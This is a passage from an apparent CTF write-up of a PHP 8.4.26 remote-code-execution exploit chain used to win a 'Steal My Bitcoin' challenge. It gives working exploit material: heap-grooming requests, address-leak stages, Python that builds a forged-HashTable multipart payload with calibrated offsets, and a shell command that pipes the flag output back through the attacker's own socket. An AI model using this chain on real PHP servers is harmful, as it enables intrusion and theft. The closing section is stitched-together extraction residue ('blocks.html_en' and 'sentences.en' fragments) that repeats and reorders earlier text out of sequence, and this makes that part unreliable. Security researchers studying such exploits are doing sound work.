poisoned worker. By sending everything in one shot, the server's TCP stack buffers all nine requests, and the worker processes them back-to-back with no gap. Why 8 consumers and not just 1? Simply to maximize our chances of hitting the exact worker that holds the stale pointer. Pipelining pushes all nine requests down one TCP connection, but depending on the server's architecture, there's no hard guarantee every single one lands on the same backend worker. Sending 8 consumers means 8 opportunities for one of them to reach that poisoned worker and extract the leak. The producer also carries something weird in its HTTP headers: 1001 empty cookie pairs. COOKIE_PAIRS = 1001 # In the HTTP header: Cookie: 00=;01=;02=;03=;04=;05=;...zz=; Why?? Because PHP has to parse every single cookie name and allocate memory for it. These 1001 empty cookies are another form of heap grooming they consume specific bin sizes during header parsing, pushing the allocator's state into a position where the session ID string ends up on the right page. Remember, EVERYTHING is calibration. Even the HTTP headers are part of the exploit. Three connections, not one We mentioned this briefly earlier, but because it was fast, it's really easy to get it wrong: the entire exploit is NOT packed into a single mega pipeline or one giant request. The three stages actually use three separate TCP connections: Connection 1: [heap producer] + [8 heap consumers] → heap chunk base Connection 2: [code producer] + [8 code consumers] → zval_ptr_dtor Connection 3: [final callback single request] → RCE Each target.connect() in the code opens a brand new socket. Within a leak stage, the producer and its 8 consumers MUST reach the same worker , that's the whole point of pipelining them together. But between stages? Completely separate connections. The heap leak, code leak, and final callback can each land on different workers. Now you might be thinking: "Hold on... if they hit different workers, how do the leaked addresses still work? Doesn't ASLR randomize each process independently?" The answer comes from how PHP Alpine CLI's multi-worker mode creates its workers: fork(). The master process loads libphp.so, sets up the runtime, and then forks child workers. When fork() happens, every child inherits the exact same virtual memory layout from the parent. That means the code base address is identical across all workers, zval_ptr_dtor sits at the same address in Worker A, Worker B, Worker C, and Worker D. So a code pointer leaked from one worker works perfectly for any other worker in the same pool. The heap is a different story. Each worker allocates its own Zend MM chunks independently after the fork. But the allocation pattern is deterministic enough that the calibration constants (HEAP_CARRIER_DELTA and HEAP_CARRIER_OFFSET) hold across workers. Same binary, same startup sequence, same request shape = same heap layout. On a noisy production server with hundreds of workers and unpredictable traffic? Those heap offsets would be much less reliable. That's one more reason why this exploit is hard to pull off in the wild but on a quiet CTF target, it works. So the attacker needs to do two things: First, they need to know WHERE the forged table will land. And they do, because they leaked the heap base in Stage 1. ASLR is defeated. From that heap base, the offset to where a specific allocation will end up is deterministic for a given build. The attacker can predict: "if I send a field with this exact size at this exact moment in the request, its value will land at address X." Second, they need to make PHP actually GO to that address during cleanup. So the attacker plants a raw pointer to the forged table inside another field (a "primer") that PHP's cleanup routines will walk through during the OOM teardown. It's basically a trail of breadcrumbs. During the cleanup, PHP reads that pointer from the primer, thinks: "Ah, I need to clean up the array located at this address," follows it, arrives at the forged HashTable, and treats it like legitimate data. We'll see exactly how this pointer planting works when we get to the real practice section for Stage 4. In short: PHP isn't constructing anything here. That's the fundamental idea behind structure forgery: PHP expects valid metadata, but the memory it trusts now contains a trap.... The trigger: PHP does the dirty work Here We are going to start this part with the ultimate twist we found earlier: the attacker doesn't need to actively trigger the exploit command themselves. PHP does it for them. So what actually happens when PHP follows those breadcrumbs and reaches our forged HashTable?? At the end of a request, or when an OOM bailout fires, PHP has to clean up after itself. Part of that cleanup process involves destroying data structures that are no longer needed. During that destruction, PHP walks through pointers it finds in the parsed request data and tries to clean up whatever they point to. If one of those pointers has been planted by the attacker to point at the forged HashTable sitting on the heap... PHP walks right into the trap and tries to destroy it like a normal array. When PHP goes to destroy a zend_array, it looks at the pDestructor field to know how to clean up the array's contents. Normally, as we saw earlier, this points to a safe function like zval_ptr_dtor. But PHP doesn't check if the pDestructor pointer is legitimate. It doesn't check if it still points to zval_ptr_dtor. It just blindly trusts the pointer sitting at that exact memory offset and jumps to it. This is the actual code from zend_hash_destroy() in php-src/Zend/zend_hash.c (hash/mixed array path, which is the path our forged table takes): Bucket *p = ht->arData; Bucket *end = p + ht->nNumUsed; if (ht->pDestructor) { SET_INCONSISTENT(HT_IS_DESTROYING); if (HT_HAS_STATIC_KEYS_ONLY(ht)) { if (HT_IS_WITHOUT_HOLES(ht)) { do { ht->pDestructor(&p->val); } while (++p != end); } } // ... other branches for non-static keys / arrays with holes ... } PHP loops over every Bucket in arData and calls pDestructor(&p->val) on each element's zval. Now here's the key detail. The Bucket struct (from php-src/Zend/zend_types.h) looks like this: typedef struct _Bucket { zval val; // <--- offset 0 zend_ulong h; zend_string *key; } Bucket; val is the very first member of Bucket, sitting at offset 0. That means for the first bucket: &p->val == arData. The pointer pDestructor receives is numerically identical to arData itself. And the attacker sets nNumUsed = 1, so only that one call ever happens. One call is all it takes. But wait. There's something we're missing here. Before jumping into the actual exploit code, let's think about what we just described. We said that the goal is to overwrite the pDestructor pointer with the address of another function: zif_system. But here's the problem: zif_system is meant to execute system commands. How do we actually give it a command to execute? Think about it. PHP has been tricked into calling our function, but we don't control how PHP calls it. We don't get to choose the arguments PHP passes to that function. PHP simply calls it using the data it finds at the expected memory locations. So how do we make sure that when PHP jumps to zif_system, it finds exactly what it needs to execute our command? And this is why i said earlier its not that simple ... The trick isn't just to forge one structure. It's to make three different structures coexist in the same memory region, each one playing a different role. Let's break it down. The real payload: three structures in one Remember our forged array where we simply overwrote pDestructor with zif_system_addr? That was a simplified explanation. In reality, you can't just pass a raw command string to the engine and expect it to run. The memory layout the attacker uploads doesn't just forge a single array it forges three different structures overlapping in the exact same memory space: // Conceptual illustration of the attacker's 384-byte payload: // 1. The Forged Array (HashTable) struct ForgedArray { uint32_t gc_refcount; // Fake reference count to keep it alive uint32_t type_flags; // Marked as a valid IS_ARRAY // ... uint64_t arData; // Points to Address + 0x20 (Right inside this same struct!) <------- this is important // ... uint64_t pDestructor; // Overwritten with zif_system_addr }; // 2. The Fake String (zend_string) starting at offset 0x80 struct FakeString { uint32_t gc_refcount; uint64_t length; // Length of the command char val[]; // Payload: "cat /etc/passwd\0" }; Why go through the trouble of overlapping all these structures? Because modern PHP internal functions are strictly typed. In PHP 8.4.26, internal API functions like zif_system do not accept simple char* strings. If PHP's cleanup routine blindly passed a raw string into zif_system, the worker process would instantly trigger a segmentation fault and crash. Under the hood, the engine defines zif_system with a very specific signature: void zif_system(zend_execute_data *execute_data, zval *return_value); As we just saw, the cleanup loop calls ht->pDestructor(&p->val) on the first element, and &p->val == arData. Because pDestructor now points to zif_system, and zif_system expects its first argument to be a zend_execute_data*, the engine blindly interprets whatever arData points to as a call frame. But there's a catch. pDestructor passes one argument (a zval). zif_system expects two: (zend_execute_data execute_data, zval *return_value). On x86_64, the first argument goes into the RDI register, the second into RSI. So execute_data receives our arData pointer correctly, but return_value gets whatever garbage happened to be sitting in RSI at that moment, not something PHP deliberately provides. It doesn't matter: zif_system calls C system() before it ever touches return_value. So the cleanup routine quietly transforms into: // what actually executes (x86_64 calling convention): // RDI = &p->val = arData = target_address + 0x20 (our fake call frame) // RSI = uncontrolled (whatever was in the register) zif_system((zend_execute_data*)(target_address + 0x20), ???); This is where the exact byte alignment becomes the most critical part of the exploit. By pointing arData exactly 0x20 bytes into their own payload, the attacker feeds zif_system a perfectly structured, fake call frame. The function reads the frame, sees num_args is set to 1, follows the arg1_pointer down to offset 0x80, finds the forged zend_string, and flawlessly executes the injected shell command without crashing the engine. Real practice: delivering the final payload (Stage 4) Alright so we've explained the theory of forging a HashTable and how PHP's cleanup path calls pDestructor on it. But we haven't shown how that forged table actually gets delivered to the right memory address in a real attack. And trust me... this is where the whole thing comes together. Remember, the attacker now has two addresses from the previous stages: Heap chunk base from the 256-byte cookie leak zval_ptr_dtor address from the 16-byte cookie leak From zval_ptr_dtor, they calculate where zif_system lives (it's always at a fixed offset from zval_ptr_dtor in the same binary): DTOR_LOW21 = 0x112930 ZIF_SYSTEM_FROM_DTOR = -0x204BC0 zif_system = dtor + ZIF_SYSTEM_FROM_DTOR And from the heap chunk base, they calculate exactly where the forged table needs to land: HEAP_CARRIER_DELTA = 0x8400000 HEAP_CARRIER_OFFSET = 0x16D1D8 target = heap_base - HEAP_CARRIER_DELTA + HEAP_CARRIER_OFFSET These offsets (HEAP_CARRIER_DELTA and HEAP_CARRIER_OFFSET) were measured in a local lab: run the same PHP build, trigger the same sequence, and watch in GDB where the "hold" field's zend_string value ends up relative to the leaked chunk base. The relationship is deterministic for a given build and worker count. The final multipart request Now let's look at what the actual HTTP request body looks like: def callback_multipart(heap_base, dtor, command): target = heap_base - HEAP_CARRIER_DELTA + HEAP_CARRIER_OFFSET forged = forge_hashtable(target, dtor + ZIF_SYSTEM_FROM_DTOR, command) bnd = FINAL_BOUNDARY fields = [] # Step 1: 1000 deeply nested file fields to trigger OOM for i in range(1000): name = b"f[" + str(i).encode() + b"]" + b"[x]" * 54 fields.append(mp_field(bnd, name, filename=b"")) # Step 2: Primer — 276 bytes with target address at slot 13 primer = bytearray(b"Q" * 276) struct.pack_into("<Q", primer, 13 * 8, target) # Step 3: The critical sequence fields += [ mp_field(bnd, b"", bytes(primer)), # primer mp_field(bnd, b"a", b"1"), # spacer mp_field(bnd, b"hold", forged), # THE FORGED HASHTABLE mp_field(bnd, b"K" * 128000 + b"[x]", b"1") # OOM trigger ] return close_multipart(fields, bnd) There's a LOT going on here. Let me break it down piece by piece. The 1000 nested fields are NOT for leaking anything this time. They're the OOM fuel again, similar to Stage 1. But they use a different nesting depth (54 instead of 57) and they exist to set up the memory landscape before the real payload arrives. The primer is a 276-byte value stuffed with Q characters (0x51), except at byte offset 104 (slot 13 × 8 bytes), where the target heap address is written as a raw 8-byte little-endian value. During the OOM cleanup, PHP's internal routines walk through various data structures. One of those walks reads a pointer from this exact position. If that pointer points to a valid address on the heap, PHP follows it and tries to destroy whatever is there. So the primer is basically telling PHP: "Hey, when you clean up after the OOM crash, go look at this specific address." And what's sitting at that address? The forged HashTable. The order of the last four fields is CRITICAL. The "hold" field must be parsed and its value (forged) must be allocated on the heap before the last giant field name (K × 128000 + [x]) triggers the final OOM. If you swap the order, the forged data never gets allocated and the exploit fails. Here's the timeline: PHP starts parsing the final request │ ▼ 1000 nested fields parsed → memory fills up but doesn't OOM yet │ ▼ Primer field parsed → 276 bytes allocated, target pointer planted at slot 13 │ ▼ Spacer field "a" parsed → small allocation, fine-tunes frontier │ ▼ "hold" field parsed → 384-byte forged HashTable allocated on the heap ← THIS MUST HAPPEN FIRST │ ▼ Giant field name "KKK...K[x]" parsed → 128,000+ byte field name PHP tries to allocate nested arrays for all those brackets │ X OUT OF MEMORY! │ ▼ zend_bailout() → cleanup begins │ ▼ Cleanup follows the primer's pointer at slot 13 → finds the forged HashTable │ ▼ Reads pDestructor = zif_system → calls it with our command │ ▼ BOOM. Shell command executes. ok the command is running.. how does its output get back to us? When zif_system executes our command, it calls the C system() function, which runs the command with sh -c. The command's stdout goes to... the PHP process's stdout. NOT to the HTTP response body. Think about it. The command is being executed inside a cleanup callback. PHP isn't in the middle of building an HTTP response. It's in the middle of tearing down a failed request. There's no output buffer connected to the client. If we just ran cat /etc/passwd, the output would vanish into the server's stdout (maybe a log file, maybe /dev/null). So how does the attacker get the output? They use one of the cleverest tricks in the entire exploit: they find their own TCP socket inside /proc and redirect the output there. def build_command(nonce): command = ( # Step 1: Find the established connection's inode from /proc/net/tcp "i=$(awk '$4=="01"{print $10;exit}' /proc/net/tcp*);" # Step 2: Find which file descriptor maps to that socket "f=5;for x in /proc/self/fd/*;do " "[ "$(readlink "$x")" = "socket:[$i]" ]&&f=${x##*/};done;" # Step 3: Redirect everything to that file descriptor f'eval "{{ echo {nonce};id;sha256sum \"$(which print-flag)\";' 'print-flag;}>&$f 2>&$f"' ).encode("ascii") return command this is genuinely beautiful: Step 1: /proc/net/tcp (and /proc/net/tcp6) lists every TCP connection the process has. Column 4 is the connection state: 01 means ESTABLISHED. The attacker's command grabs the inode number (column 10) of the first established connection. On a PHP worker that's currently handling this HTTP request, that established connection IS the attacker's TCP socket. Step 2: The command then loops through /proc/self/fd/, a directory where Linux exposes every open file descriptor of the current process as a symlink. Each symlink's target tells you what it points to: a file, a pipe, or a socket (shown as socket:[inode]). The loop finds which file descriptor number points to the socket with the inode from step 1. Step 3: Now the attacker knows the file descriptor number. They redirect their command's stdout and stderr to it using shell redirection (>&$f 2>&$f). The output flows directly into the TCP socket, which means it shows up in the HTTP response body that the attacker's client is reading. The command also includes a nonce , a random hex string generated microseconds before the request is sent: nonce = secrets.token_hex(8) # e.g., "a1b2c3d4e5f60718" Why a nonce? Because the attacker needs to prove the response is fresh. If the response contains a random string that was chosen right before the request, it proves that the command actually executed on this run and isn't cached or replayed. The id command and the sha256sum of the print-flag binary serve the same purpose: they're execution evidence that only a live shell could produce. The Real-World Friction: If you read through the previous sections, you might think that breaking into a PHP server is as simple as sending three or four well crafted HTTP requests in a row. It sounds clean, deterministic, and almost guaranteed. But is it truly that easy in the real world? The short answer is: No. When you move from a quiet, theoretical lab environment to a noisy, production web server with real traffic, this attack chain becomes incredibly difficult to pull off. Here is why: 1. Worker Process Roulette In our explanation, we relied heavily on a stale pointer remaining in the memory of a specific PHP worker process between Request #1 (the UAF trigger) and Request #2 (the memory leak/forgery). However, production web servers (like Apache with PHP-FPM or mod_php) use a large pool of worker processes to handle concurrent traffic. If you send Request #1, it might be processed by Worker A. If you immediately send Request #2, the server's load balancer might route it to Worker B, Worker C, or Worker D. Because the stale pointer lives entirely inside Worker A's isolated memory space, your follow up requests will completely fail unless they happen to land on that exact same worker. On a busy server with hundreds of workers, hitting the same worker consecutively is a game of chance. And to maximize our chances there are always smart tricks that we can try as using the last byte synchronization technique or HTTP pipelining. HTTP Pipelining: Instead of sending requests one by one over separate TCP connections which risks a load balancer scattering them across different PHP-FPM workers HTTP Pipelining allows us to push the initial memory exhaustion request and all follow up payload requests down a single TCP connection, this is the technique we used when sending 1 producer followed by 8 consumers. By concatenating the requests and sending them all in one go using a single socket write, the server's may be forced to hand that entire stream to a single worker to process sequentially. This may help us bypass the "Worker Roulette" problem while minimizing the window for legitimate traffic to interfere. Is it guaranteed? No, absolutely not. A reverse proxy or load balancer may terminate the client connection and dispatch each request independently. If the infrastructure breaks the pipeline apart, those requests can still get scattered across different backend workers. 2. The Memory Layout Lottery: everything we talked about changes completely depending on: The exact PHP version (e.g., 8.4.26 vs 8.4.27). The architecture (e.g., x86_64 vs aarch64). The specific operating system and compiler used to build the image (e.g., Debian vs. Alpine Linux). If an attacker tries to use an offset calibrated for an Alpine PHP build on a Debian server, the math will be wrong. The exploit will point pDestructor into random garbage memory, crashing the worker process instead of executing code. Attackers must painstakingly investigate the target's exact environment and calibrate their offsets before launching the attack. 3. Allocation Noise The entire exploit relies on the memory allocator cleanly handing the attacker back the exact same memory chunk that was just freed. In a perfectly quiet lab, this works beautifully. On a real web server, hundreds of legitimate users are constantly making requests, causing the PHP engine to rapidly allocate and free memory in the background. If another user's request happens to claim that freed memory chunk a microsecond before the attacker's Request #2 arrives, the exploit fails. Furthermore, the memory positioning of the forged data itself is highly sensitive. it can fluctuate depending on what else the worker was doing. Because of this noise, attackers often have to run the exploit chain in a loop, making a large number of retries and hoping that the stars align for just one of them. Case Study: The "Steal My Bitcoin" Challenge Because exploiting memory-corruption vulnerabilities reliably can be extremely difficult, a security researcher known as James Pavur, posting as cloudlandsdev, launched a public CTF challenge called "Steal My Bitcoin" on October 24, 2026. The challenge was designed to test whether the recently disclosed PHP2Shell vulnerabilities could be exploited against an internet-facing server in practice. The target ran an unpatched PHP 8.4.26 environment. A Bitcoin wallet credential was stored on the server and could be retrieved by executing a designated binary named print-flag with the privileges of the PHP process. The initial prize was worth approximately $500, and community donations increased the advertised pool to 0.02511679 BTC, valued at approximately $2,021 when the challenge was won. The first person to exploit the vulnerability and read the flag would get to keep the wallet. At first, no one could crack it. Early skepticism arose, but it turned out the server was initially misconfigured it was serving static HTML through PHP's built in development server, meaning the vulnerable session parsing code paths were never actually executed. Once the organizer adjusted the setup to a real-world PHP deployment, the race was on. At 15:47 UTC on October 25, a researcher known as KillaBoi, also known as Killa, successfully achieved remote code execution. The challenge website recorded the win approximately 19.28 hours after launch, but the successful exploitation occurred less than three hours after the PHP endpoint was added. So yes, pulling off modern memory corruption exploits on a live server is incredibly hard, highly complicated, and extremely sensitive to environmental noise but as this challenge proved, it is still doable. KillaBoi (@KillaBoi), for publishing your exploit and making it possible to study, reproduce, and compare your approach with my own. Congratulations again on solving the challenge! blocks.html_en: To understand why 51, we first need to understand how the Zend memory allocator organizes freed memory.

sentences.en: To understand why 51, we first need to understand how the Zend memory allocator organizes freed memory.

blocks.html_en: The allocator doesn't just throw all freed memory into one messy pile. It organizes freed chunks into different linked lists (called bins or freelists) strictly based on their size. The allocator has a bin for 8-byte chunks, a bin for 16-byte chunks, a bin for 32-byte chunks and so on ,around 30 bins in total, each for a specific size class.

sentences.en: The allocator doesn't just throw all freed memory into one messy pile.
It organizes freed chunks into different linked lists (called bins or freelists) strictly based on their size.
The allocator has a bin for 8-byte chunks, a bin for 16-byte chunks, a bin for 32-byte chunks and so on ,around 30 bins in total, each for a specific size class.

blocks.html_en: So when you want to allocate 48 bytes, the allocator checks the 48-byte bin and says "You need 48 bytes? Perfect, I have a 48-byte chunk right here." And it gets allocated in the place of the old freed chunk. When you free a 48-byte chunk, it goes back to that bin and waits to be claimed by another allocation.

blocks.html_en: Now what happens when a bin is empty for a specific size? Let's say we call emalloc(80) but there's no 80-byte chunk available in bin 8. The allocator goes and grabs more space from the Wilderness.

blocks.html_en: What is the Wilderness? In the beginning, the allocator grabs a huge memory chunk for the entire heap in PHP, that's a 2 MiB (2,097,152 bytes) aligned block. But it doesn't use it all at once. It divides the chunk into 512 pages of 4,096 bytes each. Only a few pages are used initially, the rest sit untouched at the end of the chunk as the Wilderness. Just some free space, not needed yet.

sentences.en: What is the Wilderness?

But it doesn't use it all at once.
It divides the chunk into 512 pages of 4,096 bytes each.
Only a few pages are used initially, the rest sit untouched at the end of the chunk as the Wilderness.
Just some free space, not needed yet.

blocks.html_en: When a bin's freelist is empty, the allocator carves a fresh page from the Wilderness and slices it into slots of that bin's size. Pages are claimed sequentially, one by one, advancing the "frontier" from page 1 toward page 511.

blocks.html_en: Now here's the thing that trips everyone up. You might be thinking: "Why can't we just send the forged data with the exact same size as the stale pointer? It would go into bin 7 (64 bytes), the allocator would pop the stale pointer's old slot from the freelist, and our forged data lands right there. Done!"

blocks.html_en: Here's the problem. When Request #1 crashes (OOM → bailout → longjmp()), PHP calls zend_mm_shutdown() which frees the entire chunk. Everything gets reset — all bins are emptied, all freelists cleared, the Wilderness frontier goes back to the beginning. It's like the whole 2 MiB block is wiped clean.

blocks.html_en: So why exactly 51? Because bin 8 keeps consuming pages from the Wilderness as we send more fields. Each bin 8 page holds 51 slots (4096 ÷ 80 = 51, with 16 bytes wasted at the end). As bin 8's freelist runs dry, the allocator carves fresh pages advancing the frontier deeper and deeper into the chunk. Combined with the bin 3 key allocations, plus all the internal PHP allocations (class tables, function tables, built in strings, content disposition headers, all consuming their own pages before and alongside our fields), the frontier creeps forward page by page.

blocks.html_en: One more thing you'll notice if you look at the raw dumps, each padding value actually appears twice in memory one right next to the other one. Why?? Because PHP's multipart parser creates multiple heap allocations for each field value. There's a temporary buffer where the raw bytes are first read from the HTTP body, and then safe_php_register_variable() calls ZVAL_STRINGL() which allocates a brand new zend_string by copying the bytes for the $_POST entry. For our 48 byte padding values, that zend_string copy is 24+48+1=73 bytes rounded to 80 bytes, which is bin 8. The temporary buffer gets freed but ZendMM doesn't zero freed memory, so the bytes stick around. That's why you see duplicate copies of "v0045", "v0046", etc. in the dumps.

blocks.html_en: So I built a debug version of PHP 8.4.26 from source with --enable-debug. Debug builds keep emalloc() as a real function call, keep memcpy() as a real function call, and most importantly have full debug symbols so backtraces show you the actual file and line number. The catch is that debug builds add overhead to every allocation (guard bytes, canaries, tracking headers) which changes the sizes and bin assignments, so the exploit doesn't groom the same way and the forged data doesn't actually reach PS(id). But that's fine because I didn't need the exploit to work, I just needed to READ THE SOURCE CODE that the debug build gave me access to.

blocks.html_en: And the reason this was invisible in the release build?? In optimized builds, the compiler inlines erealloc(NULL, 80) into direct bin 8 freelist pointer manipulation (a few mov instructions, no function call) and inlines memcpy(out, buf, 79) into a series of rep movsb or register moves. There is literally no function boundary for GDB to break on. The allocation and the copy are just anonymous instructions buried in the middle of a 1588 line disassembly of rfc1867_post_handler. blocks.html_en: All nine requests are written to the socket before reading any responses. This is critical. If the attacker waited for the producer's response before sending consumers, there's a window where another user's request could steal the poisoned worker.
